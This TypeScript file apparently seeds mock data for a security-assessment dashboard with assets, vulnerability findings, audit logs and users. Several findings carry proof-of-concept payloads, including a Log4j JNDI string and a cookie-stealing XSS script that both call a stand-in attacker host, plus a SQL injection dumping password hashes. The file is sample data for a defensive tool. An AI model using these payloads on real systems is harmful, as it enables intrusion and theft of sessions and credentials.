import { Asset, Finding, Assessment, AuditLog, User, Project } from './types';

export const initialAssets: Asset[] = [
  {
    id: 'ast-101',
    type: 'Domain',
    name: 'Production API Gateway',
    address: 'api.prod.reforge.io',
    criticality: 'Critical',
    environment: 'Production',
    tags: ['core-api', 'kubernetes', 'gateway'],
    lastScanned: '2026-07-09T18:30:00Z',
    status: 'Active'
  },
  {
    id: 'ast-102',
    type: 'IP',
    name: 'Internal Database Cluster Instance',
    address: '10.240.12.83',
    criticality: 'Critical',
    environment: 'Production',
    tags: ['database', 'cluster', 'node-03'],
    lastScanned: '2026-07-09T17:45:00Z',
    status: 'Active'
  },
  {
    id: 'ast-103',
    type: 'URL',
    name: 'Customer Authentication Portal',
    address: 'https://portal.auth.internal/login',
    criticality: 'High',
    environment: 'Production',
    tags: ['identity', 'keycloak', 'external'],
    lastScanned: '2026-07-09T16:00:00Z',
    status: 'Active'
  },
  {
    id: 'ast-104',
    type: 'Cloud',
    name: 'Customer S3 Object Storage',
    address: 's3://rf-customer-data-01',
    criticality: 'High',
    environment: 'Production',
    tags: ['aws-s3', 'storage', 'pii'],
    lastScanned: '2026-07-09T15:15:00Z',
    status: 'Active'
  },
  {
    id: 'ast-105',
    type: 'Server',
    name: 'Staging Build Runner VM',
    address: 'runner-04.stage.reforge.io',
    criticality: 'Medium',
    environment: 'Staging',
    tags: ['ci-cd', 'jenkins', 'internal'],
    lastScanned: '2026-07-08T22:00:00Z',
    status: 'Active'
  },
  {
    id: 'ast-106',
    type: 'Application',
    name: 'Legacy Admin Dashboard',
    address: 'https://admin-legacy.dev.reforge.internal',
    criticality: 'Medium',
    environment: 'Development',
    tags: ['django', 'legacy', 'deprecated'],
    lastScanned: '2026-07-07T12:00:00Z',
    status: 'Inactive'
  }
];

export const initialFindings: Finding[] = [
  {
    id: 'fnd-201',
    identifier: 'CVE-2024-1242',
    title: 'Log4j Apache Remote Code Execution Discovery',
    description: 'An issue was discovered in Apache Log4j2 in versions up to 2.15.0 where the message lookups feature could be exploited by attackers to execute arbitrary code via JNDI lookups.',
    severity: 'Critical',
    cvss: 9.8,
    asset: 'api.prod.reforge.io',
    status: 'In Triage',
    mitreAttack: 'T1190 - Exploit Public-Facing Application',
    cwe: 'CWE-502: Deserialization of Untrusted Data',
    owasp: 'A08:2021-Software and Data Integrity Failures',
    proofOfConcept: `curl -H 'X-Api-Version: \${jndi:ldap://attacker.reforge.io/a}' https://api.prod.reforge.io/`,
    recommendation: 'Update log4j-core library dependency to version 2.17.1 or higher. Alternatively, configure systems with formatMsgNoLookups=true flag.',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
      'https://logging.apache.org/log4j/2.x/security.html'
    ],
    assignedTo: 'S. Architect',
    discoveredAt: '2026-07-09T14:19:45Z',
    evidence: 'Log files indicating JNDI lookup string payload received in User-Agent header from attacker source IP.',
    comments: [
      { id: 'c-1', user: 'soc.lead@reforge.io', text: 'Confirmed this affects our production API gateway. Raising high alert.', timestamp: '2026-07-09T15:00:00Z' }
    ],
    history: [
      { id: 'h-1', user: 'System Scanner', action: 'Discovered finding via automated scan', timestamp: '2026-07-09T14:19:45Z' }
    ],
    attachments: ['gateway_access_log.txt']
  },
  {
    id: 'fnd-202',
    identifier: 'CVE-2023-9912',
    title: 'Authentication Bypass via Insecure Direct Object Reference (IDOR)',
    description: 'The API does not properly validate authorization claims when requesting user configuration records. Any authenticated user can bypass access rules by swapping user identifier query strings.',
    severity: 'High',
    cvss: 8.5,
    asset: 'portal.auth.internal',
    status: 'Assigned',
    mitreAttack: 'T1539 - Steal Web Session Cookie',
    cwe: 'CWE-639: IDOR Auth Bypass',
    owasp: 'A01:2021-Broken Access Control',
    proofOfConcept: `GET /api/v1/users/admin-override HTTP/1.1\nHost: portal.auth.internal\nCookie: session_user_id=normal_user`,
    recommendation: 'Implement strict server-side validation to verify that the authenticated session user actually owns or is authorized to request the targeted identifier.',
    references: [
      'https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control'
    ],
    assignedTo: 'S. Architect',
    discoveredAt: '2026-07-09T13:00:00Z',
    evidence: 'Captured HTTP response containing complete administrative profile under a standard guest login.',
    comments: [],
    history: []
  },
  {
    id: 'fnd-203',
    identifier: 'CVE-2024-0012',
    title: 'Misconfigured Public S3 Bucket Exposing Sensitive Artifacts',
    description: 'An Amazon S3 bucket was found to have a public ACL set, allowing anonymous users to list files and download confidential customer database backups.',
    severity: 'High',
    cvss: 7.5,
    asset: 'rf-customer-data-01',
    status: 'Resolved',
    mitreAttack: 'T1530 - Data from Cloud Storage Object',
    cwe: 'CWE-306: Missing Authentication for Sensitive Function',
    owasp: 'A05:2021-Security Misconfiguration',
    proofOfConcept: `aws s3 ls s3://rf-customer-data-01/ --no-sign-request`,
    recommendation: 'Enable S3 Block Public Access at the bucket and account levels. Apply explicit bucket policies restricting access to designated IAM roles.',
    references: [
      'https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html'
    ],
    assignedTo: 'Blue Team',
    discoveredAt: '2026-07-09T11:45:00Z',
    evidence: 'Download logs indicating successful file retrieval without authorization tokens.',
    comments: [],
    history: []
  },
  {
    id: 'fnd-204',
    identifier: 'CVE-2024-8822',
    title: 'SQL Injection Vulnerability in Global Search Filter Endpoint',
    description: 'An input validation vulnerability allows attackers to inject raw SQL commands into the search bar, which are executed directly on the primary backend database server.',
    severity: 'Critical',
    cvss: 9.3,
    asset: '10.240.12.83',
    status: 'Open',
    mitreAttack: 'T1190 - Exploit Public-Facing Application',
    cwe: 'CWE-89: SQL Injection',
    owasp: 'A03:2021-Injection',
    proofOfConcept: `GET /api/v1/search?q=test' UNION SELECT username, password_hash FROM users-- HTTP/1.1`,
    recommendation: 'Refactor search controller query using parametrized prepared statements. Bind parameters securely using the ORM compiler.',
    references: [
      'https://owasp.org/www-community/attacks/SQL_Injection'
    ],
    assignedTo: 'SOC Lead',
    discoveredAt: '2026-07-09T10:15:00Z',
    evidence: 'Execution of SQL queries returning schema metadata into the front-end user interface response logs.',
    comments: [],
    history: []
  },
  {
    id: 'fnd-205',
    identifier: 'CVE-2024-9182',
    title: 'Cross-Site Scripting (XSS) via Legacy User profile fields',
    description: 'The legacy admin application fails to encode output in custom profile fields, leading to Stored Cross-Site Scripting when administrator views the target profile page.',
    severity: 'Medium',
    cvss: 6.1,
    asset: 'https://admin-legacy.dev.reforge.internal',
    status: 'Open',
    mitreAttack: 'T1204.002 - User Execution: Malicious Link',
    cwe: 'CWE-79: Improper Neutralization of Input',
    owasp: 'A03:2021-Injection',
    proofOfConcept: `<script>fetch('http://attacker.reforge.io/steal?cookie='+document.cookie)</script>`,
    recommendation: 'Sanitize Profile biography HTML rendering with DOMPurify, or enforce React raw element string escape defaults.',
    references: [
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
    ],
    assignedTo: 'Blue Team',
    discoveredAt: '2026-07-08T09:30:00Z',
    evidence: 'Injected script execution upon profile landing page payload load.',
    comments: [],
    history: []
  }
];

export const initialAssessments: Assessment[] = [
  {
    id: 'asm-301',
    name: 'Q3 Enterprise External Red Team Assessment',
    scope: ['api.prod.reforge.io', 'portal.auth.internal', 'rf-customer-data-01'],
    rulesOfEngagement: 'Strictly active during off-peak hours (02:00 - 06:00 UTC). Do not flood database connection pools. No active destructive testing or persistent backdoor installs.',
    status: 'Active',
    progress: 68,
    startDate: '2026-07-01',
    endDate: '2026-07-15',
    assignedTeam: ['S. Architect', 'Lead Pentester', 'SOC Analyst'],
    findingsCount: 4
  },
  {
    id: 'asm-302',
    name: 'Automated Kubernetes Node Audit Scan',
    scope: ['10.240.12.83', 'runner-04.stage.reforge.io'],
    rulesOfEngagement: 'Fully automated scanning via REDFORGE agent collectors. Run weekly vulnerability scans.',
    status: 'Completed',
    progress: 100,
    startDate: '2026-07-05',
    endDate: '2026-07-06',
    assignedTeam: ['System Automator'],
    findingsCount: 1
  },
  {
    id: 'asm-303',
    name: 'Regulatory ISO-27001 Pre-Compliance Audit',
    scope: ['All Corporate Networks', 'Cloud Accounts'],
    rulesOfEngagement: 'Visual verification and configuration audit. Passive scanning only.',
    status: 'Scheduled',
    progress: 0,
    startDate: '2026-08-01',
    endDate: '2026-08-10',
    assignedTeam: ['Security Manager', 'External Auditor'],
    findingsCount: 0
  }
];

export const initialAuditLogs: AuditLog[] = [
  {
    id: 'log-501',
    timestamp: '2026-07-09T22:14:10Z',
    user: 'davedhruvi076@gmail.com',
    action: 'Initiated targeted credential-stuffing vulnerability scan',
    ip: '192.168.4.150',
    browser: 'Chrome 125.0 / Linux',
    severity: 'Info'
  },
  {
    id: 'log-502',
    timestamp: '2026-07-09T22:12:45Z',
    user: 'davedhruvi076@gmail.com',
    action: 'Discovered critical vulnerability: CVE-2024-8822 (SQLi)',
    ip: '10.0.1.25',
    browser: 'System Scanner Agent v3.1',
    severity: 'Critical'
  },
  {
    id: 'log-503',
    timestamp: '2026-07-09T21:40:02Z',
    user: 'lead.pentester@reforge.io',
    action: 'Configured new assessment target scope: Q3 Red Team Campaign',
    ip: '198.51.100.82',
    browser: 'Firefox 126.0 / macOS',
    severity: 'Warning'
  },
  {
    id: 'log-504',
    timestamp: '2026-07-09T21:05:11Z',
    user: 'davedhruvi076@gmail.com',
    action: 'Updated finding status of CVE-2024-0012 to Resolved',
    ip: '192.168.4.150',
    browser: 'Chrome 125.0 / Linux',
    severity: 'Info'
  }
];

export const initialUsers: User[] = [
  {
    id: 'usr-401',
    name: 'S. Architect',
    email: 'davedhruvi076@gmail.com',
    role: 'Administrator',
    status: 'Active',
    avatar: 'SA'
  },
  {
    id: 'usr-402',
    name: 'H. Miller',
    email: 'lead.pentester@reforge.io',
    role: 'Lead Pentester',
    status: 'Active',
    avatar: 'HM'
  },
  {
    id: 'usr-403',
    name: 'C. Ramirez',
    email: 'soc.lead@reforge.io',
    role: 'Security Analyst',
    status: 'Active',
    avatar: 'CR'
  },
  {
    id: 'usr-404',
    name: 'M. Vance',
    email: 'manager@reforge.io',
    role: 'Security Manager',
    status: 'Active',
    avatar: 'MV'
  }
];

export const initialProjects: Project[] = [
  {
    id: 'proj-001',
    name: 'Enterprise Perimeter Audit',
    description: 'Continuous monitoring of public-facing gateways, external subdomains, cloud entry points, and legacy web portals.',
    health: 'Degraded',
    status: 'Active',
    scope: ['*.reforge.io', 'api.prod.reforge.io', 'portal.auth.internal', 'rf-customer-data-01'],
    rulesOfEngagement: 'Testing only during off-peak hours (02:00 - 06:00 UTC). Standard SQLi, XSS, and authorization bypass probing is allowed. Do not perform heavy load testing.',
    assetsCount: 4,
    findingsCount: { Critical: 1, High: 2, Medium: 0, Low: 0 },
    assessmentsCount: 1,
    team: ['S. Architect', 'Lead Pentester', 'Security Manager'],
    notes: 'Perimeter needs special attention. Cloud buckets were recently hardened but legacy servers remain unpatched.',
    createdAt: '2026-06-15T08:00:00Z',
    activity: [
      { id: 'act-1', text: 'Hardened S3 bucket permissions for customer storage.', timestamp: '2026-07-09T11:45:00Z', user: 'Blue Team' },
      { id: 'act-2', text: 'Discovered high vulnerability CVE-2023-9912.', timestamp: '2026-07-09T13:00:00Z', user: 'S. Architect' }
    ]
  },
  {
    id: 'proj-002',
    name: 'Internal DevSecOps Scan',
    description: 'Vulnerability assessments for staging VMs, CI/CD runners, and private database servers inside corporate subnets.',
    health: 'Healthy',
    status: 'Active',
    scope: ['10.240.12.83', 'runner-04.stage.reforge.io', 'https://admin-legacy.dev.reforge.internal'],
    rulesOfEngagement: 'Automated continuous discovery scans are authorized. No destructive actions on DB servers.',
    assetsCount: 3,
    findingsCount: { Critical: 1, High: 0, Medium: 1, Low: 0 },
    assessmentsCount: 1,
    team: ['S. Architect', 'Security Analyst'],
    notes: 'Internal DB server contains a SQL Injection that has been locked down from outer access, but still needs patching.',
    createdAt: '2026-07-01T10:30:00Z',
    activity: [
      { id: 'act-3', text: 'Completed automated Kubernetes node scan.', timestamp: '2026-07-06T18:00:00Z', user: 'System Automator' }
    ]
  }
];

